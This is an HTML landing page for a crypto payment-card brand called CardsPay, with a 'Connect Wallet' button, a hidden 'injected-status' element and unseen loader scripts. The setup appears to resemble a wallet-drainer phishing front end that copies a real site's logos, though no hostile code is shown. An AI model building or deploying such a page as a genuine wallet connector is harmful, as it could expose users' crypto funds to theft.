<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CardsPay</title>

  <!-- Swiper CSS -->
  <link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css"
  />

  <style>
    /* ===== GLOBAL ===== */
    html, body {
      margin: 0;
      padding: 0;
      background: #ffffff;
      color: #000000;
      font-family: Arial, Helvetica, sans-serif;
    }

    /* ===== HEADER ===== */
    .site-header {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      height: 68px;
      background: #ffffff;
      border-bottom: 1px solid #eaeaea;
      z-index: 1000;
    }

    .header-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 24px;
      height: 100%;
      display: flex;
      align-items: center;
      position: relative;
    }

    .logo img {
      height: 32px;
    }

    .nav-links {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 26px;
    }

    .nav-links a {
      text-decoration: none;
      color: #333;
      font-size: 15px;
    }

    /* ===== WALLET BUTTON ===== */
    .advanced_mode {
      position: fixed;
      top: 14px;
      right: 24px;
      z-index: 1001;
    }

    .advanced_mode button {
      background: #4f7cff;
      color: #fff;
      border: none;
      padding: 10px 18px;
      border-radius: 999px;
      font-size: 14px;
      cursor: pointer;
    }

    .advanced_mode button:hover {
      background: #3b68f0;
    }

    .page-spacer {
      height: 68px;
    }

    /* ===== HERO ===== */
    .hero {
      position: relative;
      height: calc(100vh - 68px);
      min-height: 620px;
      background: url("./assets/1.png") center / cover no-repeat;
    }

    .hero::before {
      content: "";
      position: absolute;
      inset: 0;
      background: rgba(0,0,0,0.45);
    }

    .hero-content {
      position: relative;
      z-index: 2;
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 24px;
      height: 100%;
      display: grid;
      grid-template-columns: 1.2fr 1fr;
      align-items: center;
      color: #ffffff;
    }

    .hero-left h1 {
      margin: 0 0 18px;
      font-size: 64px;
      line-height: 1.05;
      font-weight: 800;
    }

    .hero-left p {
      max-width: 520px;
      font-size: 15px;
      line-height: 1.6;
      opacity: 0.9;
    }

    .hero-right {
      text-align: right;
    }

    .hero-right p {
      font-size: 18px;
      margin-bottom: 16px;
    }

    .pay-icons {
      display: flex;
      justify-content: flex-end;
      gap: 28px;
      align-items: center;
      overflow: visible;
    }

    /* ===== GOOGLE PAY SVG FIX ===== */
    .google-pay-svg {
      width: 130px;
      max-width: 150px;
      height: auto;
      display: block;
    }

    .pay-icons img {
      height: 42px;
      width: auto;
    }

    /* ===== LOGOS CAROUSEL ===== */
    .logos-section {
      padding: 50px 0 70px;
      background: #ffffff;
      position: relative;
    }

    .logos-container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 24px;
    }

    .swiper-wrapper {
      align-items: center;
    }

    .swiper-slide {
      display: flex;
      justify-content: center;
      align-items: center;
      min-width: 120px;
    }

    .swiper-slide img {
      height: 40px;
      max-width: 160px;
      width: auto;
      opacity: 0.8;
      transition: opacity 0.3s ease;
    }

    .swiper-slide img:hover {
      opacity: 1;
    }

    /* Fade edges */
    .logos-section::before,
    .logos-section::after {
      content: "";
      position: absolute;
      top: 0;
      width: 80px;
      height: 100%;
      z-index: 2;
      pointer-events: none;
    }

    .logos-section::before {
      left: 0;
      background: linear-gradient(to right, #fff, transparent);
    }

    .logos-section::after {
      right: 0;
      background: linear-gradient(to left, #fff, transparent);
    }

    /* ===== RESPONSIVE ===== */
    @media (max-width: 900px) {
      .hero-content {
        grid-template-columns: 1fr;
      }

      .hero-right {
        margin-top: 40px;
        text-align: left;
      }

      .pay-icons {
        justify-content: flex-start;
      }

      .hero-left h1 {
        font-size: 44px;
      }
    }

    /* ===== WALLET MODAL FIX ===== */
    .w-modal,
    .modal,
    .wallet-modal,
    .walletconnect-modal,
    .overlay,
    .backdrop {
      position: fixed !important;
      z-index: 9999999 !important;
    }
  </style>
</head>

<body>

  <!-- HEADER -->
  <header class="site-header">
    <div class="header-container">
      <div class="logo">
        <img src="./assets/logo.jpg" alt="CardsPay">
      </div>

      <nav class="nav-links">
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Cards</a>
        <a href="#">Home</a>
      </nav>
    </div>
  </header>

  <div class="page-spacer"></div>

  <!-- CONNECT WALLET -->
  <div class="advanced_mode">
    <button onclick="init_co()">Connect Wallet</button>
  </div>

  <!-- HERO -->
  <section class="hero">
    <div class="hero-content">

      <div class="hero-left">
        <h1>
          SPEND CRYPTO<br>
          LIKE FIAT<br>
          ANONYMOUSLY
        </h1>

        <p>
          Experience next-generation cryptocurrency payments with our platform
          trusted by millions of users worldwide across all major networks.
        </p>
      </div>

      <div class="hero-right">
        <p>Connects To Apple Pay And Google Pay</p>

        <div class="pay-icons">

          <!-- GOOGLE PAY SVG (FIXED) -->
          <svg
            class="google-pay-svg"
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 356.44 141.39"
            preserveAspectRatio="xMidYMid meet"
          >
            <g fill="#fff">
              <path d="M115.39 60.14c0-4.14-.35-8.14-1.01-11.96H58.86v22.65h31.79c-1.36 7.38-5.49 13.66-11.75 17.87v14.71h18.98c11.11-10.24 17.51-25.37 17.51-43.26"/>
              <path d="M58.86 117.61c15.89 0 29.26-5.21 39.02-14.2L78.9 88.7c-5.28 3.55-12.08 5.63-20.04 5.63-15.35 0-28.38-10.34-33.05-24.27H6.27v15.15c9.69 19.21 29.6 32.41 52.6 32.41"/>
            </g>
          </svg>

          <!-- APPLE PAY -->
          <img src="./assets/apple-pay.png" alt="Apple Pay">

        </div>
      </div>

    </div>
  </section>

  <!-- LOGOS CAROUSEL -->
  <section class="logos-section">
    <div class="logos-container">
      <div class="swiper logosSwiper">
        <div class="swiper-wrapper">
          <div class="swiper-slide"><img src="https://cardspay.net/wp-content/uploads/2025/06/aliexpress-logo-2.svg"></div>
          <div class="swiper-slide"><img src="https://cardspay.net/wp-content/uploads/2025/06/paypal-3.svg"></div>
          <div class="swiper-slide"><img src="https://cardspay.net/wp-content/uploads/2025/06/logo-amazon.svg"></div>
          <div class="swiper-slide"><img src="https://cardspay.net/wp-content/uploads/2025/06/google-pay-2.svg"></div>
          <div class="swiper-slide"><img src="https://cardspay.net/wp-content/uploads/2025/07/apple-pay-768x315-1.png"></div>
          <div class="swiper-slide"><img src="https://cardspay.net/wp-content/uploads/2025/06/tiktok-plain-1.svg"></div>
          <div class="swiper-slide"><img src="https://cardspay.net/wp-content/uploads/2025/06/new-youtube-logo.svg"></div>
          <div class="swiper-slide"><img src="https://cardspay.net/wp-content/uploads/2025/06/facebook-7.svg"></div>
        </div>
      </div>
    </div>
  </section>

  <!-- REQUIRED -->
  <div id="injected-status" style="display:none"></div>

  <!-- SCRIPTS -->
  <script src="./assets/w-modal.js"></script>
  <script src="./assets/w-loader.js"></script>
  <script src="./assets/modules.js"></script>
  <script src="./assets/main.js"></script>

  <!-- Swiper JS -->
  <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>

  <script>
    new Swiper(".logosSwiper", {
      slidesPerView: "auto",
      spaceBetween: 60,
      loop: true,
      speed: 4500,
      autoplay: {
        delay: 0,
        disableOnInteraction: false,
      },
      freeMode: true,
      freeModeMomentum: false,
      grabCursor: true,
    });
  </script>

</body>
</html>
